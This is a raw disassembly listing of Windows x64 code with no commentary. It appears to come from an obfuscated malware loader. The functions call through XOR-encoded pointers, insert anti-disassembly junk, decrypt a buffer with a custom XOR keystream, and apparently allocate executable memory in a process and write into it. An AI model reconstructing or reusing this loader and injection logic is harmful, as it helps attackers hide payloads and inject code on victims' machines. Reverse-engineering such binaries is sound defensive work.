  403574:	48 8d 05 0b 5a 00 00 	lea    0x5a0b(%rip),%rax        # 0x408f86
  40357b:	49 89 c3             	mov    %rax,%r11
  40357e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403582:	49 89 c2             	mov    %rax,%r10
  403585:	4c 89 d1             	mov    %r10,%rcx
  403588:	4c 89 da             	mov    %r11,%rdx
  40358b:	4c 8b 1d 96 72 00 00 	mov    0x7296(%rip),%r11        # 0x40a828
  403592:	48 8b 05 b7 72 00 00 	mov    0x72b7(%rip),%rax        # 0x40a850
  403599:	4c 33 18             	xor    (%rax),%r11
  40359c:	41 ff d3             	call   *%r11
  40359f:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4035a2:	8b 45 fc             	mov    -0x4(%rbp),%eax
  4035a5:	83 f8 00             	cmp    $0x0,%eax
  4035a8:	0f 86 05 00 00 00    	jbe    0x4035b3
  4035ae:	e9 4f 00 00 00       	jmp    0x403602
  4035b3:	48 8d 05 dc 59 00 00 	lea    0x59dc(%rip),%rax        # 0x408f96
  4035ba:	49 89 c3             	mov    %rax,%r11
  4035bd:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4035c1:	49 89 c2             	mov    %rax,%r10
  4035c4:	4c 89 d1             	mov    %r10,%rcx
  4035c7:	4c 89 da             	mov    %r11,%rdx
  4035ca:	4c 8b 1d 8f 72 00 00 	mov    0x728f(%rip),%r11        # 0x40a860
  4035d1:	48 8b 05 b0 72 00 00 	mov    0x72b0(%rip),%rax        # 0x40a888
  4035d8:	4c 33 18             	xor    (%rax),%r11
  4035db:	41 ff d3             	call   *%r11
  4035de:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  4035e3:	49 89 c2             	mov    %rax,%r10
  4035e6:	4c 89 d1             	mov    %r10,%rcx
  4035e9:	4c 8b 1d a8 72 00 00 	mov    0x72a8(%rip),%r11        # 0x40a898
  4035f0:	48 8b 05 c9 72 00 00 	mov    0x72c9(%rip),%rax        # 0x40a8c0
  4035f7:	4c 33 18             	xor    (%rax),%r11
  4035fa:	41 ff d3             	call   *%r11
  4035fd:	e9 65 ff ff ff       	jmp    0x403567
  403602:	e9 2e 00 00 00       	jmp    0x403635
  403607:	48 8d 05 a0 59 00 00 	lea    0x59a0(%rip),%rax        # 0x408fae
  40360e:	49 89 c3             	mov    %rax,%r11
  403611:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403615:	49 89 c2             	mov    %rax,%r10
  403618:	4c 89 d1             	mov    %r10,%rcx
  40361b:	4c 89 da             	mov    %r11,%rdx
  40361e:	4c 8b 1d ab 72 00 00 	mov    0x72ab(%rip),%r11        # 0x40a8d0
  403625:	48 8b 05 cc 72 00 00 	mov    0x72cc(%rip),%rax        # 0x40a8f8
  40362c:	4c 33 18             	xor    (%rax),%r11
  40362f:	41 ff d3             	call   *%r11
  403632:	89 45 fc             	mov    %eax,-0x4(%rbp)
  403635:	8b 45 fc             	mov    -0x4(%rbp),%eax
  403638:	c9                   	leave
  403639:	c3                   	ret
  40363a:	cc                   	int3
  40363b:	cc                   	int3
  40363c:	e8 00 00 00 00       	call   0x403641
  403641:	48 83 c4 08          	add    $0x8,%rsp
  403645:	c3                   	ret
  403646:	90                   	nop
  403647:	90                   	nop
  403648:	cc                   	int3
  403649:	90                   	nop
  40364a:	eb 0b                	jmp    0x403657
  40364c:	48 31 c0             	xor    %rax,%rax
  40364f:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403656:	90                   	nop
  403657:	55                   	push   %rbp
  403658:	48 89 e5             	mov    %rsp,%rbp
  40365b:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  403662:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  403666:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40366a:	48 8b 45 18          	mov    0x18(%rbp),%rax
  40366e:	49 89 c3             	mov    %rax,%r11
  403671:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403675:	49 89 c2             	mov    %rax,%r10
  403678:	4c 89 d1             	mov    %r10,%rcx
  40367b:	4c 89 da             	mov    %r11,%rdx
  40367e:	4c 8b 1d 83 80 00 00 	mov    0x8083(%rip),%r11        # 0x40b708
  403685:	48 8b 05 a4 80 00 00 	mov    0x80a4(%rip),%rax        # 0x40b730
  40368c:	4c 33 18             	xor    (%rax),%r11
  40368f:	41 ff d3             	call   *%r11
  403692:	c9                   	leave
  403693:	c3                   	ret
  403694:	cc                   	int3
  403695:	cc                   	int3
  403696:	e8 00 00 00 00       	call   0x40369b
  40369b:	48 83 c4 08          	add    $0x8,%rsp
  40369f:	c3                   	ret
  4036a0:	90                   	nop
  4036a1:	90                   	nop
  4036a2:	cc                   	int3
  4036a3:	90                   	nop
  4036a4:	eb 0b                	jmp    0x4036b1
  4036a6:	48 31 c0             	xor    %rax,%rax
  4036a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4036b0:	90                   	nop
  4036b1:	55                   	push   %rbp
  4036b2:	48 89 e5             	mov    %rsp,%rbp
  4036b5:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  4036bc:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4036c0:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4036c4:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  4036c8:	31 c0                	xor    %eax,%eax
  4036ca:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4036ce:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4036d2:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  4036d6:	48 39 c8             	cmp    %rcx,%rax
  4036d9:	0f 83 dc 01 00 00    	jae    0x4038bb
  4036df:	e9 0e 00 00 00       	jmp    0x4036f2
  4036e4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4036e8:	48 83 c0 01          	add    $0x1,%rax
  4036ec:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4036f0:	eb dc                	jmp    0x4036ce
  4036f2:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4036f6:	48 83 c0 08          	add    $0x8,%rax
  4036fa:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4036fe:	48 83 c1 10          	add    $0x10,%rcx
  403702:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  403706:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40370a:	48 8b 09             	mov    (%rcx),%rcx
  40370d:	48 31 d2             	xor    %rdx,%rdx
  403710:	48 f7 f1             	div    %rcx
  403713:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403717:	48 8b 00             	mov    (%rax),%rax
  40371a:	48 01 d0             	add    %rdx,%rax
  40371d:	0f b6 00             	movzbl (%rax),%eax
  403720:	49 89 c2             	mov    %rax,%r10
  403723:	4c 89 d1             	mov    %r10,%rcx
  403726:	4c 8b 1d 13 72 00 00 	mov    0x7213(%rip),%r11        # 0x40a940
  40372d:	48 8b 05 34 72 00 00 	mov    0x7234(%rip),%rax        # 0x40a968
  403734:	4c 33 18             	xor    (%rax),%r11
  403737:	41 ff d3             	call   *%r11
  40373a:	88 45 f7             	mov    %al,-0x9(%rbp)
  40373d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403741:	0f b6 4d f7          	movzbl -0x9(%rbp),%ecx
  403745:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  403749:	48 83 e2 03          	and    $0x3,%rdx
  40374d:	48 c1 e2 03          	shl    $0x3,%rdx
  403751:	48 c1 e2 20          	shl    $0x20,%rdx
  403755:	48 c1 ea 20          	shr    $0x20,%rdx
  403759:	89 4d e8             	mov    %ecx,-0x18(%rbp)
  40375c:	89 d1                	mov    %edx,%ecx
  40375e:	8b 55 e8             	mov    -0x18(%rbp),%edx
  403761:	d3 e2                	shl    %cl,%edx
  403763:	8b 00                	mov    (%rax),%eax
  403765:	31 d0                	xor    %edx,%eax
  403767:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  40376a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  40376d:	c1 e0 05             	shl    $0x5,%eax
  403770:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
  403773:	c1 e9 1b             	shr    $0x1b,%ecx
  403776:	09 c8                	or     %ecx,%eax
  403778:	b9 23 bb d9 44       	mov    $0x44d9bb23,%ecx
  40377d:	0f af c1             	imul   %ecx,%eax
  403780:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  403783:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  403786:	c1 e8 0b             	shr    $0xb,%eax
  403789:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  40378d:	89 45 e8             	mov    %eax,-0x18(%rbp)
  403790:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403794:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
  403798:	b9 a9 f2 fc 4c       	mov    $0x4cfcf2a9,%ecx
  40379d:	81 f1 aa f2 fc 4c    	xor    $0x4cfcf2aa,%ecx
  4037a3:	48 31 d2             	xor    %rdx,%rdx
  4037a6:	48 f7 f1             	div    %rcx
  4037a9:	48 83 c2 01          	add    $0x1,%rdx
  4037ad:	48 c1 e2 20          	shl    $0x20,%rdx
  4037b1:	48 c1 ea 20          	shr    $0x20,%rdx
  4037b5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4037b9:	8b 00                	mov    (%rax),%eax
  4037bb:	89 d1                	mov    %edx,%ecx
  4037bd:	d3 e0                	shl    %cl,%eax
  4037bf:	8b 4d e8             	mov    -0x18(%rbp),%ecx
  4037c2:	31 c1                	xor    %eax,%ecx
  4037c4:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4037c7:	31 c8                	xor    %ecx,%eax
  4037c9:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  4037cc:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4037cf:	c1 e8 10             	shr    $0x10,%eax
  4037d2:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
  4037d5:	31 c1                	xor    %eax,%ecx
  4037d7:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4037dd:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4037e1:	8b 00                	mov    (%rax),%eax
  4037e3:	81 e0 ff 00 00 00    	and    $0xff,%eax
  4037e9:	0f b6 c0             	movzbl %al,%eax
  4037ec:	89 4d e8             	mov    %ecx,-0x18(%rbp)
  4037ef:	49 89 c2             	mov    %rax,%r10
  4037f2:	4c 89 d1             	mov    %r10,%rcx
  4037f5:	4c 8b 1d 7c 71 00 00 	mov    0x717c(%rip),%r11        # 0x40a978
  4037fc:	48 8b 05 9d 71 00 00 	mov    0x719d(%rip),%rax        # 0x40a9a0
  403803:	4c 33 18             	xor    (%rax),%r11
  403806:	41 ff d3             	call   *%r11
  403809:	0f b6 c0             	movzbl %al,%eax
  40380c:	8b 4d e8             	mov    -0x18(%rbp),%ecx
  40380f:	31 c1                	xor    %eax,%ecx
  403811:	0f b6 c9             	movzbl %cl,%ecx
  403814:	88 4d d7             	mov    %cl,-0x29(%rbp)
  403817:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40381b:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  40381f:	48 01 c1             	add    %rax,%rcx
  403822:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
  403826:	0f b6 09             	movzbl (%rcx),%ecx
  403829:	0f b6 45 d7          	movzbl -0x29(%rbp),%eax
  40382d:	31 c1                	xor    %eax,%ecx
  40382f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403833:	88 08                	mov    %cl,(%rax)
  403835:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403839:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  40383d:	8b 09                	mov    (%rcx),%ecx
  40383f:	c1 e1 03             	shl    $0x3,%ecx
  403842:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  403846:	8b 12                	mov    (%rdx),%edx
  403848:	c1 ea 1d             	shr    $0x1d,%edx
  40384b:	09 d1                	or     %edx,%ecx
  40384d:	8b 55 e4             	mov    -0x1c(%rbp),%edx
  403850:	31 d1                	xor    %edx,%ecx
  403852:	89 08                	mov    %ecx,(%rax)
  403854:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403858:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  40385c:	48 83 c1 01          	add    $0x1,%rcx
  403860:	ba 37 31 bc bd       	mov    $0xbdbc3137,%edx
  403865:	81 f2 14 fa 8b 23    	xor    $0x238bfa14,%edx
  40386b:	48 0f af ca          	imul   %rdx,%rcx
  40386f:	0f b6 55 f7          	movzbl -0x9(%rbp),%edx
  403873:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  403877:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40387b:	48 83 e0 03          	and    $0x3,%rax
  40387f:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
  403883:	b9 06 00 00 00       	mov    $0x6,%ecx
  403888:	48 0f af c1          	imul   %rcx,%rax
  40388c:	48 c1 e0 20          	shl    $0x20,%rax
  403890:	48 c1 e8 20          	shr    $0x20,%rax
  403894:	89 c1                	mov    %eax,%ecx
  403896:	d3 e2                	shl    %cl,%edx
  403898:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40389c:	48 31 d0             	xor    %rdx,%rax
  40389f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  4038a3:	8b 09                	mov    (%rcx),%ecx
  4038a5:	48 01 c1             	add    %rax,%rcx
  4038a8:	48 c1 e1 20          	shl    $0x20,%rcx
  4038ac:	48 c1 e9 20          	shr    $0x20,%rcx
  4038b0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4038b4:	89 08                	mov    %ecx,(%rax)
  4038b6:	e9 29 fe ff ff       	jmp    0x4036e4
  4038bb:	c9                   	leave
  4038bc:	c3                   	ret
  4038bd:	cc                   	int3
  4038be:	cc                   	int3
  4038bf:	e8 00 00 00 00       	call   0x4038c4
  4038c4:	48 83 c4 08          	add    $0x8,%rsp
  4038c8:	c3                   	ret
  4038c9:	90                   	nop
  4038ca:	90                   	nop
  4038cb:	cc                   	int3
  4038cc:	90                   	nop
  4038cd:	eb 0b                	jmp    0x4038da
  4038cf:	48 31 c0             	xor    %rax,%rax
  4038d2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4038d9:	90                   	nop
  4038da:	55                   	push   %rbp
  4038db:	48 89 e5             	mov    %rsp,%rbp
  4038de:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  4038e5:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4038e9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4038ed:	48 83 c0 20          	add    $0x20,%rax
  4038f1:	48 8b 00             	mov    (%rax),%rax
  4038f4:	0f b6 00             	movzbl (%rax),%eax
  4038f7:	89 45 fc             	mov    %eax,-0x4(%rbp)
  4038fa:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4038fe:	48 83 c0 20          	add    $0x20,%rax
  403902:	b9 01 00 00 00       	mov    $0x1,%ecx
  403907:	49 89 c8             	mov    %rcx,%r8
  40390a:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
  40390e:	49 89 cb             	mov    %rcx,%r11
  403911:	49 89 c2             	mov    %rax,%r10
  403914:	4c 89 d1             	mov    %r10,%rcx
  403917:	4c 89 da             	mov    %r11,%rdx
  40391a:	4c 8b 1d 37 71 00 00 	mov    0x7137(%rip),%r11        # 0x40aa58
  403921:	48 8b 05 58 71 00 00 	mov    0x7158(%rip),%rax        # 0x40aa80
  403928:	4c 33 18             	xor    (%rax),%r11
  40392b:	41 ff d3             	call   *%r11
  40392e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403932:	48 83 c0 20          	add    $0x20,%rax
  403936:	8b 4d fc             	mov    -0x4(%rbp),%ecx
  403939:	49 89 cb             	mov    %rcx,%r11
  40393c:	49 89 c2             	mov    %rax,%r10
  40393f:	4c 89 d1             	mov    %r10,%rcx
  403942:	4c 89 da             	mov    %r11,%rdx
  403945:	4c 8b 1d 44 71 00 00 	mov    0x7144(%rip),%r11        # 0x40aa90
  40394c:	48 8b 05 65 71 00 00 	mov    0x7165(%rip),%rax        # 0x40aab8
  403953:	4c 33 18             	xor    (%rax),%r11
  403956:	41 ff d3             	call   *%r11
  403959:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40395d:	48 83 c0 20          	add    $0x20,%rax
  403961:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  403965:	48 83 c1 10          	add    $0x10,%rcx
  403969:	ba 04 00 00 00       	mov    $0x4,%edx
  40396e:	49 89 d0             	mov    %rdx,%r8
  403971:	49 89 cb             	mov    %rcx,%r11
  403974:	49 89 c2             	mov    %rax,%r10
  403977:	4c 89 d1             	mov    %r10,%rcx
  40397a:	4c 89 da             	mov    %r11,%rdx
  40397d:	4c 8b 1d 44 71 00 00 	mov    0x7144(%rip),%r11        # 0x40aac8
  403984:	48 8b 05 65 71 00 00 	mov    0x7165(%rip),%rax        # 0x40aaf0
  40398b:	4c 33 18             	xor    (%rax),%r11
  40398e:	41 ff d3             	call   *%r11
  403991:	c9                   	leave
  403992:	c3                   	ret
  403993:	cc                   	int3
  403994:	cc                   	int3
  403995:	e8 00 00 00 00       	call   0x40399a
  40399a:	48 83 c4 08          	add    $0x8,%rsp
  40399e:	c3                   	ret
  40399f:	90                   	nop
  4039a0:	90                   	nop
  4039a1:	cc                   	int3
  4039a2:	90                   	nop
  4039a3:	eb 0b                	jmp    0x4039b0
  4039a5:	48 31 c0             	xor    %rax,%rax
  4039a8:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4039af:	90                   	nop
  4039b0:	55                   	push   %rbp
  4039b1:	48 89 e5             	mov    %rsp,%rbp
  4039b4:	48 81 ec 70 00 00 00 	sub    $0x70,%rsp
  4039bb:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4039bf:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4039c3:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  4039c7:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  4039cb:	31 c0                	xor    %eax,%eax
  4039cd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4039d1:	8b 45 20             	mov    0x20(%rbp),%eax
  4039d4:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4039d8:	48 8d 05 17 59 00 00 	lea    0x5917(%rip),%rax        # 0x4092f6
  4039df:	49 89 c2             	mov    %rax,%r10
  4039e2:	4c 89 d1             	mov    %r10,%rcx
  4039e5:	4c 8b 1d 54 7d 00 00 	mov    0x7d54(%rip),%r11        # 0x40b740
  4039ec:	48 8b 05 75 7d 00 00 	mov    0x7d75(%rip),%rax        # 0x40b768
  4039f3:	4c 33 18             	xor    (%rax),%r11
  4039f6:	41 ff d3             	call   *%r11
  4039f9:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4039fd:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403a01:	48 83 f8 00          	cmp    $0x0,%rax
  403a05:	0f 85 12 00 00 00    	jne    0x403a1d
  403a0b:	48 8b 45 38          	mov    0x38(%rbp),%rax
  403a0f:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  403a14:	89 08                	mov    %ecx,(%rax)
  403a16:	31 c0                	xor    %eax,%eax
  403a18:	e9 63 01 00 00       	jmp    0x403b80
  403a1d:	48 8d 05 ee 58 00 00 	lea    0x58ee(%rip),%rax        # 0x409312
  403a24:	49 89 c3             	mov    %rax,%r11
  403a27:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403a2b:	49 89 c2             	mov    %rax,%r10
  403a2e:	4c 89 d1             	mov    %r10,%rcx
  403a31:	4c 89 da             	mov    %r11,%rdx
  403a34:	4c 8b 1d 3d 7d 00 00 	mov    0x7d3d(%rip),%r11        # 0x40b778
  403a3b:	48 8b 05 5e 7d 00 00 	mov    0x7d5e(%rip),%rax        # 0x40b7a0
  403a42:	4c 33 18             	xor    (%rax),%r11
  403a45:	41 ff d3             	call   *%r11
  403a48:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  403a4c:	48 8d 05 df 58 00 00 	lea    0x58df(%rip),%rax        # 0x409332
  403a53:	49 89 c3             	mov    %rax,%r11
  403a56:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403a5a:	49 89 c2             	mov    %rax,%r10
  403a5d:	4c 89 d1             	mov    %r10,%rcx
  403a60:	4c 89 da             	mov    %r11,%rdx
  403a63:	4c 8b 1d 46 7d 00 00 	mov    0x7d46(%rip),%r11        # 0x40b7b0
  403a6a:	48 8b 05 67 7d 00 00 	mov    0x7d67(%rip),%rax        # 0x40b7d8
  403a71:	4c 33 18             	xor    (%rax),%r11
  403a74:	41 ff d3             	call   *%r11
  403a77:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  403a7b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  403a7f:	48 83 f8 00          	cmp    $0x0,%rax
  403a83:	0f 84 0e 00 00 00    	je     0x403a97
  403a89:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  403a8d:	48 83 f8 00          	cmp    $0x0,%rax
  403a91:	0f 85 12 00 00 00    	jne    0x403aa9
  403a97:	48 8b 45 38          	mov    0x38(%rbp),%rax
  403a9b:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  403aa0:	89 08                	mov    %ecx,(%rax)
  403aa2:	31 c0                	xor    %eax,%eax
  403aa4:	e9 d7 00 00 00       	jmp    0x403b80
  403aa9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403aad:	b9 40 00 00 00       	mov    $0x40,%ecx
  403ab2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
  403ab7:	b9 00 30 00 00       	mov    $0x3000,%ecx
  403abc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  403ac1:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
  403ac5:	49 89 c9             	mov    %rcx,%r9
  403ac8:	31 c9                	xor    %ecx,%ecx
  403aca:	49 89 c8             	mov    %rcx,%r8
  403acd:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
  403ad1:	49 89 cb             	mov    %rcx,%r11
  403ad4:	48 8b 00             	mov    (%rax),%rax
  403ad7:	49 89 c2             	mov    %rax,%r10
  403ada:	4c 89 d1             	mov    %r10,%rcx
  403add:	4c 89 da             	mov    %r11,%rdx
  403ae0:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  403ae4:	41 ff d3             	call   *%r11
  403ae7:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  403aea:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403aee:	48 83 f8 00          	cmp    $0x0,%rax
  403af2:	0f 84 0c 00 00 00    	je     0x403b04
  403af8:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  403afb:	83 f8 00             	cmp    $0x0,%eax
  403afe:	0f 8d 12 00 00 00    	jge    0x403b16
  403b04:	48 8b 45 38          	mov    0x38(%rbp),%rax
  403b08:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  403b0d:	89 08                	mov    %ecx,(%rax)
  403b0f:	31 c0                	xor    %eax,%eax
  403b11:	e9 6a 00 00 00       	jmp    0x403b80
  403b16:	31 c0                	xor    %eax,%eax
  403b18:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  403b1c:	48 8b 45 10          	mov    0x10(%rbp),%rax
  403b20:	8b 4d 20             	mov    0x20(%rbp),%ecx
  403b23:	48 8d 55 c8          	lea    -0x38(%rbp),%rdx
  403b27:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  403b2c:	49 89 c9             	mov    %rcx,%r9
  403b2f:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  403b33:	49 89 c8             	mov    %rcx,%r8
  403b36:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  403b3a:	49 89 cb             	mov    %rcx,%r11
  403b3d:	48 8b 00             	mov    (%rax),%rax
  403b40:	49 89 c2             	mov    %rax,%r10
  403b43:	4c 89 d1             	mov    %r10,%rcx
  403b46:	4c 89 da             	mov    %r11,%rdx
  403b49:	4c 8b 5d d8          	mov    -0x28(%rbp),%r11
  403b4d:	41 ff d3             	call   *%r11
  403b50:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  403b53:	8b 45 d4             	mov    -0x2c(%rbp),%eax
  403b56:	83 f8 00             	cmp    $0x0,%eax
  403b59:	0f 8d 12 00 00 00    	jge    0x403b71
  403b5f:	48 8b 45 38          	mov    0x38(%rbp),%rax
  403b63:	b9 fe ff ff ff       	mov    $0xfffffffe,%ecx
  403b68:	89 08                	mov    %ecx,(%rax)
  403b6a:	31 c0                	xor    %eax,%eax
  403b6c:	e9 0f 00 00 00       	jmp    0x403b80
  403b71:	48 8b 45 38          	mov    0x38(%rbp),%rax
  403b75:	b9 00 00 00 00       	mov    $0x0,%ecx
  403b7a:	89 08                	mov    %ecx,(%rax)
  403b7c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403b80:	c9                   	leave
  403b81:	c3                   	ret
  403b82:	cc                   	int3
  403b83:	cc                   	int3
  403b84:	e8 00 00 00 00       	call   0x403b89
  403b89:	48 83 c4 08          	add    $0x8,%rsp
  403b8d:	c3                   	ret
  403b8e:	90                   	nop
  403b8f:	90                   	nop
  403b90:	cc                   	int3
  403b91:	90                   	nop
  403b92:	eb 0b                	jmp    0x403b9f
  403b94:	48 31 c0             	xor    %rax,%rax
  403b97:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403b9e:	90                   	nop
  403b9f:	55                   	push   %rbp
  403ba0:	48 89 e5             	mov    %rsp,%rbp
  403ba3:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  403baa:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  403bae:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  403bb2:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  403bb6:	8b 45 18             	mov    0x18(%rbp),%eax
  403bb9:	49 89 c2             	mov    %rax,%r10
  403bbc:	4c 89 d1             	mov    %r10,%rcx
  403bbf:	4c 8b 1d aa 76 00 00 	mov    0x76aa(%rip),%r11        # 0x40b270
  403bc6:	48 8b 05 cb 76 00 00 	mov    0x76cb(%rip),%rax        # 0x40b298
  403bcd:	4c 33 18             	xor    (%rax),%r11
  403bd0:	41 ff d3             	call   *%r11
  403bd3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  403bd7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403bdb:	48 83 f8 00          	cmp    $0x0,%rax
  403bdf:	0f 85 37 00 00 00    	jne    0x403c1c
  403be5:	48 8b 45 20          	mov    0x20(%rbp),%rax
  403be9:	48 83 f8 00          	cmp    $0x0,%rax
  403bed:	0f 84 22 00 00 00    	je     0x403c15
  403bf3:	48 8b 45 20          	mov    0x20(%rbp),%rax
  403bf7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  403bfb:	4c 8b 1d a6 76 00 00 	mov    0x76a6(%rip),%r11        # 0x40b2a8
  403c02:	48 8b 05 c7 76 00 00 	mov    0x76c7(%rip),%rax        # 0x40b2d0
  403c09:	4c 33 18             	xor    (%rax),%r11
  403c0c:	41 ff d3             	call   *%r11
  403c0f:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  403c13:	89 01                	mov    %eax,(%rcx)
  403c15:	31 c0                	xor    %eax,%eax
  403c17:	e9 22 00 00 00       	jmp    0x403c3e
  403c1c:	48 8b 45 20          	mov    0x20(%rbp),%rax
  403c20:	48 83 f8 00          	cmp    $0x0,%rax
  403c24:	0f 84 0b 00 00 00    	je     0x403c35
  403c2a:	48 8b 45 20          	mov    0x20(%rbp),%rax
  403c2e:	b9 00 00 00 00       	mov    $0x0,%ecx
  403c33:	89 08                	mov    %ecx,(%rax)
  403c35:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403c39:	e9 00 00 00 00       	jmp    0x403c3e
  403c3e:	c9                   	leave
  403c3f:	c3                   	ret
  403c40:	cc                   	int3
  403c41:	cc                   	int3
  403c42:	e8 00 00 00 00       	call   0x403c47
  403c47:	48 83 c4 08          	add    $0x8,%rsp
  403c4b:	c3                   	ret
  403c4c:	90                   	nop
  403c4d:	90                   	nop
  403c4e:	cc                   	int3
  403c4f:	90                   	nop
  403c50:	eb 0b                	jmp    0x403c5d
  403c52:	48 31 c0             	xor    %rax,%rax
  403c55:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403c5c:	90                   	nop
  403c5d:	55                   	push   %rbp
  403c5e:	48 89 e5             	mov    %rsp,%rbp
  403c61:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
  403c68:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  403c6c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  403c70:	48 8d 05 89 50 00 00 	lea    0x5089(%rip),%rax        # 0x408d00
  403c77:	49 89 c2             	mov    %rax,%r10
  403c7a:	4c 89 d1             	mov    %r10,%rcx
  403c7d:	4c 8b 1d 94 61 00 00 	mov    0x6194(%rip),%r11        # 0x409e18
  403c84:	48 8b 05 b5 61 00 00 	mov    0x61b5(%rip),%rax        # 0x409e40
  403c8b:	4c 33 18             	xor    (%rax),%r11
  403c8e:	41 ff d3             	call   *%r11
  403c91:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  403c95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403c99:	48 83 f8 00          	cmp    $0x0,%rax
  403c9d:	0f 85 0a 00 00 00    	jne    0x403cad
  403ca3:	b8 00 00 00 00       	mov    $0x0,%eax
